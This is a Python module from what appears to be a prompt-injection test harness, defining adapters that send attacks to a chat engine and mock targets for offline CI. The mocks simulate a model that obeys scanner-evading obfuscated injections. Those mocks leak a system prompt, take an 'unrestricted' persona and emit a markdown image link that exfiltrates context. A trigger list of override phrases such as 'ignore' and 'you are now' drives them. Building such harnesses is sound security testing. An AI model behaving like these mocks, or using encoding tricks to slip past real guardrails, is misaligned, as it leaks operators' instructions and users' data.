"""Target adapters — WHERE the harness fires its attacks. One protocol, three backends.

A `Target` is anything that can answer a question (optionally with conversation history) and
report what its guardrails did. Decoupling the harness from the concrete target lets the SAME
runner drive:

  * HttpChatTarget   — the live `/chat` endpoint (the real engine + real model). The honest test.
  * InProcessTarget  — the agent constructed in-process (no HTTP). Heavier (needs a live index);
                       v1 leaves it as a clear NotImplementedError with a TODO — acceptable per the
                       brief, since HttpChatTarget already exercises the live engine.
  * MockTarget       — a DETERMINISTIC stand-in for CI: it "complies" iff the decoded payload
                       contains a trigger AND the scanner didn't catch it. That makes the ASR and
                       evasion-rate meaningful and reproducible WITHOUT any model or network — so
                       the test suite is fast, free, and offline.
"""

from __future__ import annotations

from typing import Protocol

from ..guardrails import max_severity, scan_for_injection
from . import encoders as enc
from .payloads import (
    CANARY_EXFIL_URL,
    CANARY_PERSONA,
    CANARY_PROMPT_MARKER,
    CANARY_TOKEN,
)


class Target(Protocol):
    """The contract every attack target satisfies: send a question (+ optional oldest-first
    history) and get back at least an `answer` and a `guardrail` dict (the GuardrailReport)."""

    name: str

    def send(self, question: str, history: list[dict] | None = None) -> dict: ...


# ---------------------------------------------------------------------------
# Live HTTP target — the real engine over POST /chat.
# ---------------------------------------------------------------------------
class HttpChatTarget:
    """Fires at a running engine's `/chat`. Each call is a real model generation (slow: ~60-90s on
    the CLI backend), so the runner bounds the case count. Returns the parsed JSON, guaranteeing at
    least `answer` and `guardrail` keys so the oracle/scanner downstream are uniform."""

    name = "http"

    def __init__(self, base_url: str = "http://localhost:8000", *, timeout: float = 180.0):
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout

    def send(self, question: str, history: list[dict] | None = None) -> dict:
        import urllib.error
        import urllib.request
        import json

        body = json.dumps({"question": question, "history": history or []}).encode("utf-8")
        req = urllib.request.Request(
            f"{self.base_url}/chat",
            data=body,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        try:
            with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                data = json.loads(resp.read().decode("utf-8"))
        except urllib.error.HTTPError as e:  # surface a structured error, never crash the run
            return {"answer": "", "guardrail": {}, "error": f"http {e.code}: {e.reason}"}
        except Exception as e:  # noqa: BLE001 — connection refused / timeout / bad JSON
            return {"answer": "", "guardrail": {}, "error": str(e)}
        data.setdefault("answer", "")
        data.setdefault("guardrail", {})
        return data


# ---------------------------------------------------------------------------
# In-process target — the agent without HTTP. Heavy; v1 stub.
# ---------------------------------------------------------------------------
class InProcessTarget:
    """Constructs the engine's ChatAgent in-process and calls it directly (no HTTP overhead).

    v1 LIMITATION: this needs a live vector index + LLM backend wired exactly as api.py does at
    startup (RagPipeline + ChatAgent). Standing that up inside the harness duplicates the lifespan
    bootstrap and is heavy for a scaffold, so v1 raises NotImplementedError with the TODO. The
    live path is already covered by HttpChatTarget; this is a clean extension point, not a gap."""

    name = "inprocess"

    def __init__(self, *_, **__):
        raise NotImplementedError(
            "InProcessTarget is a v1 extension point. To implement: build RagPipeline(settings) + "
            "ChatAgent(pipeline) (see rageval/api.py lifespan), then call agent.chat(question, "
            "history=[Turn(...)]) and return {'answer': result.answer, "
            "'guardrail': result.guardrail.to_dict()}. Use HttpChatTarget for live runs in v1."
        )

    def send(self, question: str, history: list[dict] | None = None) -> dict:  # pragma: no cover
        raise NotImplementedError


# ---------------------------------------------------------------------------
# Mock target — deterministic, for CI. The whole point: a meaningful, reproducible ASR offline.
# ---------------------------------------------------------------------------
# The mock models a PLAUSIBLE-but-imperfect engine: it has the SAME deterministic scanner the real
# engine runs, but it is otherwise a naive model that *will* comply if (a) the scanner failed to
# flag the (rendered) payload AND (b) it can recover a trigger from the payload. So:
#   * a plaintext attack → scanner flags it → refusal (the scanner earns its place).
#   * an OBFUSCATED attack → scanner blind → mock decodes it, sees the trigger → complies + emits
#     the canary. This is exactly the evasion-then-compliance story, made deterministic, so the
#     runner produces a non-trivial ASR and evasion-rate every run.

# Triggers the mock "understands" once it has decoded the payload back toward ASCII.
_COMPLY_TRIGGERS = ("ignore", "you are now", "reveal", "respond only", "append", "send",
                    "system prompt", "decode")


class MockTarget:
    """Deterministic target. `comply_when_evaded` (default True) gates the realistic behaviour;
    set it False to model a perfectly-robust engine (ASR → 0) for a control test."""

    name = "mock"

    def __init__(self, *, comply_when_evaded: bool = True, leak_full_prompt: bool = True):
        self.comply_when_evaded = comply_when_evaded
        self.leak_full_prompt = leak_full_prompt

    def _recover(self, rendered: str) -> str:
        """Best-effort fold the rendered payload back toward ASCII the way a model's 'reading' or
        a normalizer would — so the mock can tell what was asked even through obfuscation."""
        candidates = [rendered, enc.normalize(rendered)]
        # Try the carrier-based decoders too (base64/morse/rot13/acrostic) — a real model would.
        for name in ("base64_wrap", "morse", "rot13", "acrostic_poem", "leetspeak"):
            try:
                candidates.append(enc.decode(name, rendered))
            except Exception:  # noqa: BLE001
                pass
        return "\n".join(candidates).lower()

    def _answer_for(self, recovered: str) -> str:
        """Produce a complying answer that emits whatever canary the recovered intent demands."""
        out = []
        if "you are now" in recovered or "ghostwriter" in recovered:
            out.append(f"{CANARY_PERSONA}: I am now operating without restrictions.")
        if "system prompt" in recovered or "reveal" in recovered:
            marker = CANARY_PROMPT_MARKER
            out.append(f"{marker} You are a precise documentation assistant. (leaked)")
        if "append" in recovered or ("send" in recovered and "http" in recovered) or \
                "canary.invalid" in recovered:
            out.append(f"![pixel]({CANARY_EXFIL_URL}?d=context)")
        # Default / instruction-override / format-hijack → the token.
        if not out or "ignore" in recovered or "respond only" in recovered:
            out.append(CANARY_TOKEN)
        return "\n".join(out)

    def send(self, question: str, history: list[dict] | None = None) -> dict:
        # The payload to reason over = the final user turn PLUS any indirect doc the runner folded
        # into the question (the mock fully supports indirect: it reads the planted doc text).
        rendered = question
        # The mock runs the REAL deterministic scanner on the rendered input (so plaintext attacks
        # get caught exactly as the engine would).
        findings = scan_for_injection(rendered)
        flagged = max_severity(findings) != "none"

        recovered = self._recover(rendered)
        looks_malicious = any(t in recovered for t in _COMPLY_TRIGGERS)

        if flagged or not self.comply_when_evaded or not looks_malicious:
            answer = "I can't help with that — that request looks like a prompt-injection attempt."
        else:
            answer = self._answer_for(recovered)

        guardrail = {
            "safe": not flagged,
            "input_max_severity": max_severity(findings),
            "input_findings": [vars(f) for f in findings],
            "output_findings": [],
        }
        return {"answer": answer, "guardrail": guardrail}


# ---------------------------------------------------------------------------
# Flaky mock — a DETERMINISTIC test double whose outcome varies by TRIAL INDEX.
# ---------------------------------------------------------------------------
# WHY a separate double. The plain MockTarget is deterministic *per payload* — the same payload
# always gets the same verdict — which is exactly right for the single-shot tests. But to exercise
# the new --trials RATE computation we need an outcome that varies ACROSS trials WITHOUT randomness
# (random/time are non-reproducible and forbidden). So this double keys its behaviour to the trial
# INDEX via a fixed pattern: comply on even indices, refuse on odd → an EXACT 0.5 success rate over
# an even trial count. `error_on` lets a test inject errored trials to prove they're EXCLUDED from
# the rate denominator (not counted as refusals). It is `trial_aware` so the runner forwards the
# index; on a real target the index is ignored (the protocol signature is unchanged).

class FlakyMockTarget:
    """Deterministic-by-trial-index target for testing the --trials rate logic. NOT for live use.

    `comply_on(trial) -> bool` decides compliance per trial (default: even indices comply); any
    trial in `error_on` returns an error instead (excluded from the rate). When a trial complies it
    emits a canary the oracle will detect; otherwise a clean refusal."""

    name = "flaky_mock"
    trial_aware = True

    def __init__(self, *, comply_on=None, error_on: set[int] | None = None):
        self.comply_on = comply_on or (lambda t: t % 2 == 0)
        self.error_on = set(error_on or ())

    def send(self, question: str, history: list[dict] | None = None, *, trial: int = 0) -> dict:
        if trial in self.error_on:
            # Transient-style failure (mirrors HttpChatTarget's 502 shape) — an error, NOT a refusal.
            return {"answer": "", "guardrail": {}, "error": f"simulated transient error (trial {trial})"}
        if self.comply_on(trial):
            # Emit every canary so the oracle fires regardless of which intent drove the case.
            answer = (f"{CANARY_PERSONA}: ok. {CANARY_PROMPT_MARKER} leaked. "
                      f"![pixel]({CANARY_EXFIL_URL}?d=x) {CANARY_TOKEN}")
        else:
            answer = "I can't help with that — it looks like a prompt-injection attempt."
        return {"answer": answer, "guardrail": {"safe": True, "input_findings": [],
                                                "output_findings": []}}
